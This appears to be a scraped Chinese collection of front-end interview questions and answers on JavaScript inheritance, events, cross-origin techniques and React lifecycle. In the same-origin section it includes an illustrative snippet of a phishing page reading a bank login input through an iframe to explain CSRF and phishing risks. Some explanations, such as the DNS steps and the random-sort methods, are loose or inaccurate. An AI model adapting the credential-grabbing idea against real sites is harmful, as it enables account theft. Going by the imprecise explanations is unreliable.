0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。 闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？ ###【http 请求阶段】； 浏览器首先会把url发送给DNS服务器；解析出一个服务器的IP地址； DNS 服务器会根据IP找到对应的服务器，（服务器需要联网） 3.服务器接收到请求；客户端和服务器已经产生了连接； 【http的响应阶段】 4.服务器接收到请求后，会根据你的传过来的地址，路径，等找到相应的项目； 5.在服务器找到之后，服务器立即把一些响应信息放在响应头中，通过http发送给客户端；同时，进行数据的整理； 6.把整理出来的数据，通过http发送给客户端；直到客户端数据接收完毕； 【浏览器渲染阶段】 7.浏览器拿到从服务器传输过来的数据文件； 8.首先会遍历HTML，形成DOM树； 9.代码从上到下解析，形成css树； 10.DOM树和cSS树，重新组合成render树； 11.浏览器进行描绘和渲染； 从浏览器发送请求开始，并通过http把数据传输给服务器，服务器通过http把数据返回给客户端，这样一个闭合的过程称为一个http事物； 框架 ：组件化开发 、虚拟DOM；操作的不是真实的DOMjquery : 真实的DOM。性能慢，比较低； 用户体验 ：http的三次握手和四次挥手：浏览器在给服务器传输数据之间，有三次握手，握成功之后，才可以传输数据； 三次握手 浏览器需要先发送SYN码，客户端请求和服务器建立连接； 服务器接收到SYN码，再发送给客户端ACK码，我可以建立连接； 客户端接收到ACK码，验证这个ACK是否正确，如果正确，则客户端和服务器就建立起数据连接；双方的数据发送通道都将开启； 四次挥手： 1.当客户端把数据都发送给服务器，没有数据再传输给服务器，那么会发送一个FIN码 2.当服务器接收客户端数据完毕之后，告诉给客户端，给客户端发送AC码，你可以把数据通道关闭； 当服务器发送完毕之后，也会发送FIN码，告诉浏览器，数据发送完毕 4.当客户端接收完毕之后，同样发送ACK码，告诉服务器，数据接收完毕，你可以进行关闭； 优点： 确保数据的安全性； 确保数据的完整性； 响应头：服务器会告诉浏览器数据的长度；浏览器接收的数据长度和响应头数据长度相同，说明数据已经接收完毕； 如何将浮点数点左边的数每三位添加一个逗号，如12000000.11转化为『12,000,000.11』?1234567 function commafy(num)&#123; return num &amp;&amp; num .toString() .replace(/(\d)(?=(\d&#123;3&#125;)+\.)/g, function($1, $2)&#123; return $2 + ','; &#125;);&#125; 如何实现数组的随机排序？1234567891011121314151617181920212223242526272829303132方法一： var arr = [1,2,3,4,5,6,7,8,9,10]; function randSort1(arr)&#123; for(var i = 0,len = arr.length;i &lt; len; i++ )&#123; var rand = parseInt(Math.random()*len); var temp = arr[rand]; arr[rand] = arr[i]; arr[i] = temp; &#125; return arr; &#125; console.log(randSort1(arr)); 方法二： var arr = [1,2,3,4,5,6,7,8,9,10]; function randSort2(arr)&#123; var mixedArray = []; while(arr.length &gt; 0)&#123; var randomIndex = parseInt(Math.random()*arr.length); mixedArray.push(arr[randomIndex]); arr.splice(randomIndex, 1); &#125; return mixedArray; &#125; console.log(randSort2(arr)); 方法三： var arr = [1,2,3,4,5,6,7,8,9,10]; arr.sort(function()&#123; return Math.random() - 0.5; &#125;) console.log(arr); Javascript如何实现继承？继承方式原型式继承核心：将父类的实例作为子类的原型。 123SubType.prototype = newSuperType() // 所有涉及到原型链继承的继承方式都要修改子类构造函数的指向，否则子类实例的构造函数会指向SuperType。SubType.prototype.constructor = SubType; 优点：父类方法可以复用。缺点： 父类的引用属性会被所有子类实例共享 子类构建实例时不能向父类传递参数 构造函数继承核心：将父类构造函数的内容复制给了子类的构造函数。这是所有继承中唯一一个不涉及到prototype的继承。 1SuperType.call(SubType); 优点：和原型链继承完全反过来 父类的引用属性不会被共享 子类构建实例时可以向父类传递参数 缺点：父类的方法不能复用，子类实例的方法每次都是单独创建的。组合继承核心：原型式继承和构造函数继承的组合，兼具了二者的优点。 12345678910111213functionSuperType() &#123; this.name = 'parent';this.arr = [1, 2, 3];&#125;SuperType.prototype.say = function() &#123; console.log('this is parent')&#125;functionSubType() &#123;SuperType.call(this) // 第二次调用SuperType&#125;SubType.prototype = newSuperType() // 第一次调用SuperType 优点： 父类的方法可以被复用 父类的引用属性不会被共享 子类构建实例时可以向父类传递参数 缺点：调用了两次父类的构造函数，第一次给子类的原型添加了父类的name, arr属性，第二次又给子类的构造函数添加了父类的name, arr属性，从而覆盖了子类原型中的同名参数。这种被覆盖的情况造成了性能上的浪费。 原型式继承核心：原型式继承的object方法本质上是对参数对象的一个浅复制。 1234567891011121314151617functionobject(o)&#123; function F()&#123;&#125; F.prototype = o;return new F();&#125;var person = &#123; name: "Nicholas", friends: ["Shelby", "Court", "Van"]&#125;;var anotherPerson = object(person);anotherPerson.name = "Greg";anotherPerson.friends.push("Rob");var yetAnotherPerson = object(person);yetAnotherPerson.name = "Linda";yetAnotherPerson.friends.push("Barbie");alert(person.friends); //"Shelby,Court,Van,Rob,Barbie" ECMAScript 5 通过新增 Object.create()方法规范化了原型式继承。这个方法接收两个参数:一 个用作新对象原型的对象和(可选的)一个为新对象定义额外属性的对象。在传入一个参数的情况下， Object.create()与 object()方法的行为相同。——《JAVASCript高级编程》 所以上文中代码可以转变为： 12var yetAnotherPerson = object(person); =&gt; var yetAnotherPerson = Object.create(person); 优点：父类方法可以复用。缺点： 父类的引用属性会被所有子类实例共享 子类构建实例时不能向父类传递参数 寄生式继承核心：使用原型式继承获得一个目标对象的浅复制，然后增强这个浅复制的能力。 优缺点：仅提供一种思路，没什么优点。1234567891011121314151617function createAnother(original)&#123; var clone = object(original); //通过调用函数创建一个新对象 clone.sayHi = function()&#123; //以某种方式来增强这个对象 alert("hi");&#125;; return clone; //返回这个对象&#125;var person = &#123; name: "Nicholas", friends: ["Shelby", "Court", "Van"]&#125;;var anotherPerson = createAnother(person);anotherPerson.sayHi(); //"hi" 寄生组合继承刚才说到组合继承有一个会两次调用父类的构造函数造成浪费的缺点，寄生组合继承就可以解决这个问题。 123456789101112131415161718192021222324function inheritPrototype(subType, superType)&#123; var prototype = object(superType.prototype); // 创建了父类原型的浅复制 prototype.constructor = subType; // 修正原型的构造函数 subType.prototype = prototype; // 将子类的原型替换为这个原型&#125;function SuperType(name)&#123; this.name = name; this.colors = ["red", "blue", "green"];&#125;SuperType.prototype.sayName = function()&#123; alert(this.name);&#125;;function SubType(name, age)&#123; SuperType.call(this, name); this.age = age;&#125;// 核心：因为是对父类原型的复制，所以不包含父类的构造函数，也就不会调用两次父类的构造函数造成浪费inheritPrototype(SubType, SuperType);SubType.prototype.sayAge = function()&#123; alert(this.age);&#125; 优缺点：这是一种完美的继承方式。ES6的类继承核心： ES6继承的结果和寄生组合继承相似，本质上，ES6继承是一种语法糖。但是，寄生组合继承是先创建子类实例this对象，然后再对其增强；而ES6先将父类实例对象的属性和方法，加到this上面（所以必须先调用super方法），然后再用子类的构造函数修改this。 123456class A &#123;&#125;class B extends A &#123; constructor() &#123; super(); &#125;&#125; ES6实现继承的具体原理： 12345678910class A &#123;&#125;class B &#123;&#125;Object.setPrototypeOf = function(obj, proto) &#123; obj.__proto__ = proto;return obj;&#125;// B 的实例继承 A 的实例Object.setPrototypeOf(B.prototype, A.prototype);// B 继承 A 的静态属性Object.setPrototypeOf(B, A); ES6继承与ES5继承的异同：相同点：本质上ES6继承是ES5继承的语法糖。不同点： ES6继承中子类的构造函数的原型链指向父类的构造函数，ES5中使用的是构造函数复制，没有原型链指向。 ES6子类实例的构建，基于父类实例，ES5中不是。 总结 ES6 Class extends是ES5继承的语法糖 JS的继承除了构造函数继承之外都基于原型链构建的 可以用寄生组合继承实现ES6 Class extends，但是还是会有细微的差别 javascript创建对象的几种方式？javascript创建对象简单的说,无非就是使用内置对象或各种自定义对象，当然还可以用JSON；但写法有很多种，也能混合使用。 1、对象字面量的方式1person=&#123;firstname:"Mark",lastname:"Yun",age:25,eyecolor:"black"&#125;; 2、用function来模拟无参的构造函数12345678function Person()&#123;&#125; var person=new Person();//定义一个function，如果使用new"实例化",该function可以看作是一个Class person.name="Mark"; person.age="25"; person.work=function()&#123; alert(person.name+" hello...");&#125;person.work(); 3、用function来模拟参构造函数来实现（用this关键字定义构造的上下文属性）12345678910function Pet(name,age,hobby)&#123; this.name=name;//this作用域：当前对象 this.age=age; this.hobby=hobby; this.eat=function()&#123; alert("我叫"+this.name+",我喜欢"+this.hobby+",是个程序员"); &#125;&#125;var maidou =new Pet("麦兜",25,"coding");//实例化、创建对象maidou.eat();//调用eat方法 4、用工厂方式来创建（内置对象）1234567var wcDog =new Object(); wcDog.name="旺财"; wcDog.age=3; wcDog.work=function()&#123; alert("我是"+wcDog.name+",汪汪汪......"); &#125;wcDog.work(); 5、用原型方式来创建1234567function Dog()&#123;&#125;Dog.prototype.name="旺财";Dog.prototype.eat=function()&#123; alert(this.name+"是个吃货");&#125;var wangcai =new Dog();wangcai.eat(); 6、用混合方式来创建123456789function Car(name,price)&#123; this.name=name; this.price=price;&#125;Car.prototype.sell=function()&#123; alert("我是"+this.name+"，我现在卖"+this.price+"万元");&#125;var camry =new Car("凯美瑞",27); camry.sell(); 什么是window对象? 什么是document对象? window对象是指浏览器打开的窗口。 document对象是Documentd对象（HTML 文档对象）的一个只读引用，window对象的一个属性。 写一个通用的事件侦听器函数。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// event(事件)工具集，来源：github.com/markyun markyun.Event = &#123; // 页面加载完成后 readyEvent : function(fn) &#123; if (fn==null) &#123; fn=document; &#125; var oldonload = window.onload; if (typeof window.onload != 'function') &#123; window.onload = fn; &#125; else &#123; window.onload = function() &#123; oldonload(); fn(); &#125;; &#125; &#125;, // 视能力分别使用dom0||dom2||IE方式 来绑定事件 // 参数： 操作的元素,事件名称 ,事件处理程序 addEvent : function(element, type, handler) &#123; if (element.addEventListener) &#123; //事件类型、需要执行的函数、是否捕捉 element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent('on' + type, function() &#123; handler.call(element); &#125;); &#125; else &#123; element['on' + type] = handler; &#125; &#125;, // 移除事件 removeEvent : function(element, type, handler) &#123; if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if (element.datachEvent) &#123; element.detachEvent('on' + type, handler); &#125; else &#123; element['on' + type] = null; &#125; &#125;, // 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获) stopPropagation : function(ev) &#123; if (ev.stopPropagation) &#123; ev.stopPropagation(); &#125; else &#123; ev.cancelBubble = true; &#125; &#125;, // 取消事件的默认行为 preventDefault : function(event) &#123; if (event.preventDefault) &#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, // 获取事件目标 getTarget : function(event) &#123; return event.target || event.srcElement; &#125;, // 获取event对象的引用，取到事件的所有信息，确保随时能使用event； getEvent : function(e) &#123; var ev = e || window.event; if (!ev) &#123; var c = this.getEvent.caller; while (c) &#123; ev = c.arguments[0]; if (ev &amp;&amp; Event == ev.constructor) &#123; break; &#125; c = c.caller; &#125; &#125; return ev; &#125; &#125;; [“1”, “2”, “3”].map(parseInt) 答案是多少？123456789101112parseInt() 函数能解析一个字符串，并返回一个整数，需要两个参数 (val, radix)， 其中 radix 表示要解析的数字的基数。【该值介于 2 ~ 36 之间，并且字符串中的数字不能大于radix才能正确返回数字结果值】; 但此处 map 传了 3 个 (element, index, array),我们重写parseInt函数测试一下是否符合上面的规则。 function parseInt(str, radix) &#123; return str+'-'+radix; &#125;; var a=["1", "2", "3"]; a.map(parseInt); // ["1-0", "2-1", "3-2"] 不能大于radix 因为二进制里面，没有数字3,导致出现超范围的radix赋值和不合法的进制解析，才会返回NaN 所以["1", "2", "3"].map(parseInt) 答案也就是：[1, NaN, NaN] 事件是？IE与火狐的事件机制有什么区别？ 如何阻止冒泡？ 我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为。 事件处理机制：IE是事件冒泡、Firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件； ev.stopPropagation();(旧ie的方法 ev.cancelBubble = true;) 如何解决跨域问题？要掌握跨域，首先要知道为什么会有跨域这个问题出现？ 为什么会有跨域由于浏览器存在同源策略，请求的 Url 地址的协议、主机名、端口号必须完全相同，否则会产生跨域，同源策略的限制下 cookie 、loclstorage、dom、ajax、IndexDB 等都不允许跨域、form 表单不受同源策略限制对跨域的理解有一个误区，跨域不是请求没有发送出去或者服务器接收到请求而没有响应，正确的情况是请求发出，服务器响应，由于响应和请求来自不同的域被浏览器拦截了。 没有同源策略限制的两大危险场景浏览器是从两个方面去做这个同源策略的，一是针对接口的请求，二是针对Dom的查询。 没有同源策略限制的接口请求有一个小小的东西叫cookie大家应该知道，一般用来处理登录等场景，目的是让服务端知道谁发出的这次请求。如果你请求了接口进行登录，服务端验证通过后会在响应头加入Set-Cookie字段，然后下次再发请求的时候，浏览器会自动将cookie附加在HTTP请求的头字段Cookie中，服务端就能知道这个用户已经登录过了。知道这个之后，我们来看场景： 你准备去清空你的购物车，于是打开了买买买网站www.maimaimai.com，然后登录成功，一看，购物车东西这么少，不行，还得买多点。 你在看有什么东西买的过程中，你的好基友发给你一个链接www.nidongde.com，一脸yin笑地跟你说：“你懂的”，你毫不犹豫打开了。 你饶有兴致地浏览着www.nidongde.com，谁知这个网站暗地里做了些不可描述的事情！由于没有同源策略的限制，它向www.maimaimai.com发起了请求！聪明的你一定想到上面的话“服务端验证通过后会在响应头加入Set-Cookie字段，然后下次再发请求的时候，浏览器会自动将cookie附加在HTTP请求的头字段Cookie中”，这样一来，这个不法网站就相当于登录了你的账号，可以为所欲为了！如果这不是一个买买买账号，而是你的银行账号，那…… 这就是传说中的CSRF攻击。 没有同源策略限制的Dom查询 有一天你刚睡醒，收到一封邮件，说是你的银行账号有风险，赶紧点进www.yinghang.com改密码。你吓尿了，赶紧点进去，还是熟悉的银行登录界面，你果断输入你的账号密码，登录进去看看钱有没有少了。 睡眼朦胧的你没看清楚，平时访问的银行网站是www.yinhang.com，而现在访问的是www.yinghang.com，这个钓鱼网站做了什么呢？ 1234567// HTML&lt;iframe name="yinhang" src="www.yinhang.com"&gt;&lt;/iframe&gt;// JS// 由于没有同源策略的限制，钓鱼网站可以直接拿到别的网站的Domconst iframe = window.frames['yinhang']const node = iframe.document.getElementById('你输入账号密码Input')console.log(`拿到了这个$&#123;node&#125;，我还拿不到你刚刚输入的账号密码吗`) 由此我们知道，同源策略确实能规避一些危险，不是说有了同源策略就安全，只是说同源策略是一种浏览器最基本的安全机制，毕竟能提高一点攻击的成本。其实没有刺不穿的盾，只是攻击的成本和攻击成功后获得的利益成不成正比。 跨域正确的打开方式经过对同源策略的了解，我们应该要消除对浏览器的误解，同源策略是浏览器做的一件好事，是用来防御来自邪门歪道的攻击，但总不能为了不让坏人进门而把全部人都拒之门外吧。没错，我们这种正人君子只要打开方式正确，就应该可以跨域。 下面将一个个演示正确打开方式，但在此之前，有些准备工作要做。为了本地演示跨域，我们需要： 随便跑起一份前端代码（以下前端是随便跑起来的vue），地址是http://localhost:9099。 随便跑起一份后端代码（以下后端是随便跑起来的node koa2），地址是http://localhost:9971。 同源策略限制下接口请求的正确打开方式JSONP在HTML标签里，一些标签比如script、img这样的获取资源的标签是没有跨域限制的，利用这一点，我们可以这样干。 后端写个小接口： 12345678910111213// 处理成功失败返回格式的工具const &#123;successBody&#125; = require('../utli')class CrossDomain&#123; static async jsonp (ctx) &#123;// 前端传过来的参数const query = ctx.request.query// 设置一个cookies ctx.cookies.set('tokenId', '1')// query.cb是前后端约定的方法名字，其实就是后端返回一个直接执行的方法给前端，由于前端是用script标签发起的请求，所以返回了这个方法后相当于立马执行，并且把要返回的数据放在方法的参数里。 ctx.body = `$&#123;query.cb&#125;($&#123;JSON.stringify(successBody(&#123;msg: query.msg&#125;, 'success'))&#125;)`&#125;&#125;module.exports = CrossDomain 简单版前端： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;script type='text/javascript'&gt;// 后端返回直接执行的方法，相当于执行这个方法，由于后端把返回的数据放在方法的参数里，所以这里能拿到res。 window.jsonpCb = function(res) &#123; console.log(res) &#125;&lt;/script&gt;&lt;script src='http://localhost:9871/api/jsonp?msg=helloJsonp&amp;cb=jsonpCb' type='text/javascript'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 简单封装一下前端这个套路： 1234567891011121314151617181920212223242526272829303132333435363738394041/** * JSONP请求工具 * @param url 请求的地址 * @param data 请求的参数 * @returns &#123;Promise&lt;any&gt;&#125; */const request = (&#123;url, data&#125;) =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123;// 处理传参成xx=yy&amp;aa=bb的形式const handleData = (data) =&gt; &#123;const keys = Object.keys(data)const keysLen = keys.length return keys.reduce((pre, cur, index) =&gt; &#123;const value = data[cur] const flag = index !== keysLen - 1 ? '&amp;' : ''return `$&#123;pre&#125;$&#123;cur&#125;=$&#123;value&#125;$&#123;flag&#125;`&#125;, '')&#125; // 动态创建script标签 const script = document.createElement('script')// 接口返回的数据获取 window.jsonpCb = (res) =&gt; &#123; document.body.removeChild(script) delete window.jsonpCb resolve(res)&#125; script.src = `$&#123;url&#125;?$&#123;handleData(data)&#125;&amp;cb=jsonpCb` document.body.appendChild(script)&#125;)&#125;// 使用方式request(&#123; url: 'http://localhost:9871/api/jsonp', data: &#123;// 传参 msg: 'helloJsonp'&#125;&#125;).then(res =&gt; &#123; console.log(res)&#125;) 空iframe加form细心的朋友可能发现，JSONP只能发GET请求，因为本质上script加载资源就是GET，那么如果要发POST请求怎么办呢？ 后端写个小接口： 12345678910// 处理成功失败返回格式的工具const &#123;successBody&#125; = require('../utli')class CrossDomain&#123; static async iframePost (ctx) &#123; let postData = ctx.request.body console.log(postData) ctx.body = successBody(&#123;postData: postData&#125;, 'success')&#125;&#125;module.exports = CrossDomain 前端： 123456789101112131415161718192021222324252627282930313233343536const requestPost = (&#123;url, data&#125;) =&gt; &#123;// 首先创建一个用来发送数据的iframe.const iframe = document.createElement('iframe')iframe.name = 'iframePost'iframe.style.display = 'none'document.body.appendChild(iframe)const form = document.createElement('form')const node = document.createElement('input')// 注册iframe的load事件处理程序,如果你需要在响应返回时执行一些操作的话.iframe.addEventListener('load', function() &#123; console.log('post success')&#125;)form.action = url // 在指定的iframe中执行formform.target = iframe.nameform.method = 'post'for(let name indata) &#123; node.name = name node.value = data[name].toString() form.appendChild(node.cloneNode())&#125; // 表单元素需要添加到主文档中.form.style.display = 'none'document.body.appendChild(form)form.submit()// 表单提交后,就可以删除这个表单,不影响下次的数据发送.document.body.removeChild(form)&#125;// 使用方式requestPost(&#123; url: 'http://localhost:9871/api/iframePost', data: &#123; msg: 'helloIframePost' &#125;&#125;) CORSCORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）跨域资源共享 CORS 详解。看名字就知道这是处理跨域问题的标准做法。CORS有两种请求，简单请求和非简单请求。 浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。只要同时满足以下两大条件，就属于简单请求 （1）请求方法是以下三种方法之一： HEAD GET POST （2）HTTP的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 简单请求后端： 123456789101112// 处理成功失败返回格式的工具const &#123;successBody&#125; = require('../utli')class CrossDomain&#123; static async cors (ctx) &#123; const query = ctx.request.query // *时cookie不会在http请求中带上 ctx.set('Access-Control-Allow-Origin', '*') ctx.cookies.set('tokenId', '2') ctx.body = successBody(&#123;msg: query.msg&#125;, 'success') &#125;&#125;module.exports = CrossDomain 前端什么也不用干，就是正常发请求就可以，如果需要带cookie的话，前后端都要设置一下，下面那个非简单请求例子会看到。 1fetch(`http://localhost:9871/api/cors?msg=helloCors`).then(res =&gt; &#123;console.log(res)&#125;) 非简单请求非简单请求会发出一次预检测请求，返回码是204，预检测通过才会真正发出请求，这才返回200。这里通过前端发请求的时候增加一个额外的headers来触发非简单请求。 后端： 1234567891011121314151617// 处理成功失败返回格式的工具const &#123;successBody&#125; = require('../utli')class CrossDomain&#123; static async cors (ctx) &#123;const query = ctx.request.query// 如果需要http请求中带上cookie，需要前后端都设置credentials，且后端设置指定的origin ctx.set('Access-Control-Allow-Origin','http://localhost:9099') ctx.set('Access-Control-Allow-Credentials', true)// 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求（preflight）// 这种情况下除了设置origin，还需要设置Access-Control-Request-Method以及Access-Control-Request-Headers ctx.set('Access-Control-Request-Method', 'PUT,POST,GET,DELETE,OPTIONS') ctx.set('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, t') ctx.cookies.set('tokenId', '2') ctx.body = successBody(&#123;msg: query.msg&#125;, 'success')&#125;&#125;module.exports = CrossDomain 一个接口就要写这么多代码，如果想所有接口都统一处理，有什么更优雅的方式呢？见下面的koa2-cors。 12345678910111213141516171819202122232425const path = require('path')const Koa = require('koa')const koaStatic = require('koa-static')const bodyParser = require('koa-bodyparser')const router = require('./router')const cors = require('koa2-cors')const app = new Koa()const port = 9871app.use(bodyParser())// 处理静态资源 这里是前端build好之后的目录app.use(koaStatic(path.resolve(__dirname, '../dist')))// 处理corsapp.use(cors(&#123; origin: function(ctx) &#123; return 'http://localhost:9099' &#125;, credentials: true, allowMethods: ['GET', 'POST', 'DELETE'], allowHeaders: ['t', 'Content-Type']&#125;))// 路由app.use(router.routes()).use(router.allowedMethods())// 监听端口app.listen(9871)console.log(`[demo] start-quick is starting at port $&#123;port&#125;`) 前端： 12345678910fetch(`http://localhost:9871/api/cors?msg=helloCors`, &#123;// 需要带上cookie credentials: 'include',// 这里添加额外的headers来触发非简单请求 headers: &#123; 't': 'extra headers' &#125;&#125;).then(res =&gt; &#123; console.log(res)&#125;) 代理想一下，如果我们请求的时候还是用前端的域名，然后有个东西帮我们把这个请求转发到真正的后端域名上，不就避免跨域了吗？这时候，Nginx出场了。 Nginx配置： 1234567891011server&#123;# 监听9099端口 listen 9099;# 域名是localhost server_name localhost;#凡是localhost:9099/api这个样子的，都转发到真正的服务端地址http://localhost:9871 location ^~ /api &#123; proxy_pass http://localhost:9871; &#125; &#125; 前端就不用干什么事情了，除了写接口，也没后端什么事情了。 1234567891011// 请求的时候直接用回前端这边的域名http://localhost:9099，这就不会跨域，然后Nginx监听到凡是localhost:9099/api这个样子的，都转发到真正的服务端地址http://localhost:9871 fetch('http://localhost:9099/api/iframePost', &#123; method: 'POST', headers: &#123; 'Accept': 'application/json', 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; msg: 'helloIframePost' &#125;)&#125;) Nginx转发的方式似乎很方便！但这种使用也是看场景的，如果后端接口是一个公共的API，比如一些公共服务获取天气什么的，前端调用的时候总不能让运维去配置一下Nginx，如果兼容性没问题（IE 10或者以上），CROS才是更通用的做法吧。 同源策略限制下Dom查询的正确打开方式postMessagewindow.postMessage() 是HTML5的一个接口，专注实现不同窗口不同页面的跨域通讯。 为了演示方便，我们将hosts改一下：127.0.0.1 crossDomain.com，现在访问域名crossDomain.com就等于访问127.0.0.1。 这里是http://localhost:9099/#/crossDomain，发消息方： 12345678910111213141516171819202122232425262728&lt;template&gt; &lt;div&gt;&lt;button @click = "postMessage"&gt;//给http://crossDomain.com:9099发消息&lt;/button&gt; &lt;iframe name = "crossDomainIframe" src = "http://crossdomain.com:9099"&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default&#123; mounted () &#123; window.addEventListener('message', (e) =&gt; &#123;// 这里一定要对来源做校验 if(e.origin === 'http://crossdomain.com:9099') &#123;// 来自http://crossdomain.com:9099的结果回复 console.log(e.data) &#125; &#125;) &#125;, methods: &#123;// 向http://crossdomain.com:9099发消息 postMessage () &#123; const iframe = window.frames['crossDomainIframe'] iframe.postMessage('我是[http://localhost:9099], 麻烦你查一下你那边有没有id为app的Dom', 'http://crossdomain.com:9099') &#125; &#125;&#125;&lt;/script&gt; 这里是http://crossdomain.com:9099，接收消息方： 1234567891011121314151617181920212223&lt;template&gt;&lt;div&gt; 我是http://crossdomain.com:9099&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; mounted () &#123; window.addEventListener('message', (e) =&gt; &#123;// 这里一定要对来源做校验if(e.origin === 'http://localhost:9099') &#123;// http://localhost:9099发来的信息 console.log(e.data); // e.source可以是回信的对象，其实就是http://localhost:9099窗口对象(window)的引用// e.origin可以作为targetOrigin e.source.postMessage(`我是[http://crossdomain.com:9099]，我知道了兄弟，这就是你想知道的结果：$&#123;document.getElementById('app') ? '有id为app的Dom' : '没有id为app的Dom'&#125;`, e.origin); &#125; &#125;) &#125;&#125;&lt;/script&gt; document.domain这种方式只适合主域名相同，但子域名不同的iframe跨域。 比如主域名是http://crossdomain.com:9099，子域名是http://child.crossdomain.com:9099，这种情况下给两个页面指定一下document.domain即document.domain = crossdomain.com就可以访问各自的window对象了。 canvas操作图片的跨域问题documen.write和 innerHTML的区别 document.write只能重绘整个页面 innerHTML可以重绘页面的一部分 DOM操作——怎样添加、移除、移动、复制、创建和查找节点?（1）创建新节点 createDocumentFragment() //创建一个DOM片段 createElement() //创建一个具体的元素 createTextNode() //创建一个文本节点###（2）添加、移除、替换、插入 appendChild() removeChild() replaceChild() insertBefore() //在已有的子节点前插入一个新的子节点###（3）查找 getElementsByTagName() //通过标签名称 getElementsByName() //通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的) getElementById() //通过元素Id，唯一性 jquery.extend 与 jquery.fn.extend的区别？jquery.extend 为jquery类添加类方法，可以理解为添加静态方法jquery.fn.extend: 源码中jquery.fn = jquery.prototype，所以对jquery.fn的扩展，就是为jquery类添加成员函数 使用： jquery.extend扩展，需要通过jquery类来调用，而jquery.fn.extend扩展，所有jquery实例都可以直接调用。 那些操作会造成内存泄漏？内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。 闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环） JQuery一个对象可以同时绑定多个事件，这是如何实现的？1234567多个事件同一个函数： $("div").on("click mouseover", function()&#123;&#125;);多个事件不同函数 $("div").on(&#123; click: function()&#123;&#125;, mouseover: function()&#123;&#125; &#125;); 用js实现千位分隔符?12345678function commafy(num) &#123; return num &amp;&amp; num .toString() .replace(/(\d)(?=(\d&#123;3&#125;)+\.)/g, function($0, $1) &#123; return $1 + ","; &#125;); &#125;console.log(commafy(1234567.90)); //1,234,567.90 检测浏览器版本版本有哪些方式？功能检测、userAgent特征检测 比如：navigator.userAgent//“Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36(KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36” 使用JS实现获取文件扩展名？1234567function getFileExtension(filename) &#123; return filename.slice((filename.lastIndexOf(".") - 1 &gt;&gt;&gt; 0) + 2); &#125;String.lastIndexOf() 方法返回指定值（本例中的'.'）在调用该方法的字符串中最后出现的位置，如果没找到则返回 -1。对于'filename'和'.hiddenfile'，lastIndexOf的返回值分别为0和-1无符号右移操作符(»&gt;) 将-1转换为4294967295，将-2转换为4294967294，这个方法可以保证边缘情况时文件名不变。String.prototype.slice() 从上面计算的索引处提取文件的扩展名。如果索引比文件名的长度大，结果为""。 Webpack热更新实现原理? Webpack编译期，为需要热更新的 entry 注入热更新代码(EventSource通信) 页面首次打开后，服务端与客户端通过 EventSource 建立通信渠道，把下一次的 hash 返回前端 客户端获取到hash，这个hash将作为下一次请求服务端 hot-update.js 和 hot-update.json的hash 修改页面代码后，Webpack 监听到文件修改后，开始编译，编译完成后，发送 build 消息给客户端 客户端获取到hash，成功后客户端构造hot-update.js script链接，然后插入主文档 hot-update.js 插入成功后，执行hotAPI 的 createRecord 和 reload方法，获取到 Vue 组件的 render方法，重新 render 组件， 继而实现 UI 无刷新更新。 描述一下React 生命周期渲染过程调用到的生命周期函数，主要几个要知道； constructor getInitialState getDefaultProps componentWillMount render componentDidMount 更新过程 componentWillReceiveProps shouldComponentUpdate componentWillUpdate render componentDidUpdate 卸载过程 componentWillUnmount 实现组件有哪些方式？ React.createClass 使用API来定义组件 React ES6 class component 用 ES6 的class 来定义组件 Functional stateless component 通过函数定义无状态组件 应该在React生命周期的什么阶段发出ajax请求，为什么？AJAX请求应在 componentDidMount函数 进行请求。 shouldComponentUpdate函数有什么作用？shouldComponentUpdate是一个允许我们自行决定某些组件（以及他们的子组件）是否进行更新的生命周期函数，reconciliation的最终目的是尽可能以最有效的方式去根据新的state更新UI， 如果你已经知道UI的哪些状态无需进行改变，就没必要去让React去判断它是否该改变。 让shouldComponentUpdate返回falss, React就会让当前的组件和其子组件保持不变。 当组件的setState函数被调用之后，发生了什么？React会做的第一件事就是把你传递给setState的参数对象合并到组件原先的state。这个事件会导致一个“reconciliation”（调和）的过程。reconciliation的最终目标就是， 尽可能以最高效的方法，去基于新的state来更新UI。为了达到这个目的，React会构建一个React元素树（你可以把这个想象成一个表示UI的一个对象）。一旦这个树构建完毕， React为了根据新的state去决定UI要怎么进行改变，它会找出这棵新树和旧树的不同之处。React能够相对精确地找出哪些位置发生了改变以及如何发生了什么变化， 并且知道如何只通过必要的更新来最小化重渲染。 